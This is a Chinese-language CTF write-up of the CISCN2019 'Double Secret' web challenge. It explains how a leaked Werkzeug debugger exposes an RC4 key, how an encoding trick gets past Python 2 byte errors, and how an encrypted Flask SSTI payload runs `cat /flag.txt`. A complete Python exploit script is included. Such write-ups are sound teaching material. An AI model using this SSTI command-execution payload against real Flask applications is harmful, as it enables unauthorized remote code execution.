---
title: CISCN2019 - Web - Double Secret
date: 2026-11-14 18:09:00
categories:
  - CTF
  - CISCN2019
  - Web
tags:
  - RC4加密
  - Flask-SSTI
  - Werkzeug调试器
  - 编码绕过
cover: /img/cover/silver-hair-blue-eyes-girl.jpg
description: CISCN2019 的 RC4 加 Flask SSTI 题。借 Werkzeug 调试器读出 app.py 真实密钥，用 latin-1 解码加 UTF-8 编码绕过 Python2 高位字节报错，再加密 SSTI 载荷读 flag。
keywords:
  - RC4
  - SSTI
  - Werkzeug
  - latin-1编码
  - CISCN2019
ai: >-
  本题来自 CISCN2019 华东南赛区，考点是 RC4 加 Flask SSTI。/secret 把提交内容 RC4 解密后交给 render_template_string 渲染成注入点；借 Werkzeug 调试器读 app.py 确认真实密钥 HereIsTreasure，secretkey.txt 是干扰项。难点是 Python2 对 URL 高位字节按 UTF-8 解码致 chr 报错，需把密文按 latin-1 解码再 UTF-8 编码发送。最终加密 SSTI 载荷读 /flag.txt，flag 随错误提示泄露，脱敏记为 flag{xxxx}。
copyright_author: Hunter
---

## 题目信息

| 项 | 内容 |
|---|---|
| 比赛 | CISCN2019 华东南赛区 |
| 方向 | Web |
| 难度 | 中等（源码泄露 + 编码绕过） |
| 环境 | 授权靶场（已脱敏） |
| 考点 | RC4 加密、Flask SSTI、Werkzeug 调试器、Python2 编码 |

## 信息收集

- `robots.txt` 泄露 `/static/secretkey.txt`，内容为 `you-will-never-guess`（**干扰项**，真实密钥不在此）。
- 盲猜 `/secret` 路由成功，返回 `Tell me your secret.I will encrypt it so others can't see`。

## 漏洞分析

### 定位注入点与源码

传入非法字符触发 Werkzeug debugger（Python 2.7 环境，路径 `/usr/local/lib/python2.7/`），泄露 `/app/app.py` 的 `secret` 函数：

```python
if(secret==None):
    return 'Tell me your secret.I will encrypt it so others can\'t see'
rc=rc4_Modified.RC4("HereIsTreasure")   # 真正的密钥
deS=rc.do_crypt(secret)
a=render_template_string(safe(deS))
if 'ciscn' in a.lower():
    return 'flag detected!'
return a
```

并泄露 `/app/rc4_Modified.py` 的 `do_crypt`：

```python
r = (self.Box[self.index_i] + self.Box[self.index_j]) % 256
R = self.Box[r]
tmp = ord(s) ^ R
test.append(tmp)
out.append(chr(tmp))   # 报错点：chr() arg not in range(256)
```

可见 `render_template_string(safe(deS))` 把解密结果当模板渲染，存在 SSTI。

### 确认 RC4 密钥

真正密钥是 `HereIsTreasure`（不是 secretkey.txt 的 `you-will-never-guess`）。通过单字符映射验证：`a→4`，`flag` 的 RC4 密文 `3\x03XR` 与服务端一致。

### 核心难点：Python2 Werkzeug 的编码问题

直接发送 RC4 密文的高位字节（`%80`-`%FF`）会失败：服务端 `do_crypt` 里 `tmp=ord(s)^R`、`out.append(chr(tmp))`，而 Werkzeug 把 URL query 里的 `%FD` 按 **UTF-8** 解码，非法序列被替换成 `U+FFFD`，`ord()` 返回 65533，`chr()` 报 `ValueError: chr() arg not in range(256)`。

解法：把 RC4 密文字节按 **latin-1** 解码成 Unicode 字符，再按 UTF-8 编码 URL 发送。高位字节 `0xFD` 变成 `%C3%BD`（`ý`，码点 U+00FD=253），服务端 `ord('ý')` 返回 253，XOR 正确。

```python
cipher = rc4(key, payload.encode('utf-8'))   # RC4 加密得 bytes
s = cipher.decode('latin-1')                 # 每个字节 -> U+0000..U+00FF
q = urllib.parse.quote(s, safe='')           # UTF-8 编码 URL：0xFD -> %C3%BD
# 发送 /secret?secret=<q>
```

验证：`{{7*7}}` 密文 `2e140e1ffd1a16`，发送后回显 `49`，SSTI 确认。

## 利用过程

1. 触发 Werkzeug debugger 读出 `app.py`、`rc4_Modified.py`，拿到密钥 `HereIsTreasure`。
2. 本地实现 RC4，对 SSTI 载荷加密 → latin-1 解码 → UTF-8 URL 编码。
3. 发送 `{{7*7}}` 验证回显 `49`。
4. 发送读文件载荷：

```python
payload = "{{ config.__class__.__init__.__globals__['os'].popen('cat /flag.txt').read() }}"
```

返回 `'class' is not allowed. Secret is flag{xxxx}`：`class` 被 WAF 过滤，但 `cat /flag.txt` 的输出中 flag 明文已随错误提示泄露，无需再绕过 WAF。

## 完整 EXP

```python
import http.client, urllib.parse

HOST = 'target:8080'  # 授权靶场（已脱敏）

def rc4(key, data):
    S = list(range(256)); j = 0; out = []
    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) % 256
        S[i], S[j] = S[j], S[i]
    i = j = 0
    for c in data:
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i]
        out.append(c ^ S[(S[i] + S[j]) % 256])
    return bytes(out)

def attack(payload):
    cipher = rc4(b'HereIsTreasure', payload.encode('utf-8'))
    q = urllib.parse.quote(cipher.decode('latin-1'), safe='')
    conn = http.client.HTTPConnection(HOST, timeout=15)
    conn.request('GET', '/secret?secret=' + q)
    return conn.getresponse().read()

payload = "{{ config.__class__.__init__.__globals__['os'].popen('cat /flag.txt').read() }}"
print(attack(payload).decode('utf-8', errors='replace'))
```

## Flag

`flag{xxxx}`（已脱敏）

## 踩坑与总结

1. **密钥识别**：`secretkey.txt` 的 `you-will-never-guess` 是干扰项，真实密钥 `HereIsTreasure` 硬编码在 `app.py`。
2. **编码绕过**：Python2 Werkzeug 对 URL 高位字节按 UTF-8 解码导致 `chr() arg not in range(256)`，需用 latin-1 解码 + UTF-8 编码的「双重编码」还原字节值。
3. **flag 泄露方式**：WAF 拦 `class`，但 flag 明文出现在错误提示中，不必死磕绕过。
4. 平台提交 `accepted`，二次复现一致。

## 参考

- <https://syunaht.com/p/1231048582.html>
- <https://www.cnblogs.com/seizer/p/17035716.html>
- <https://github.com/y0lo-0924/ctf_web>
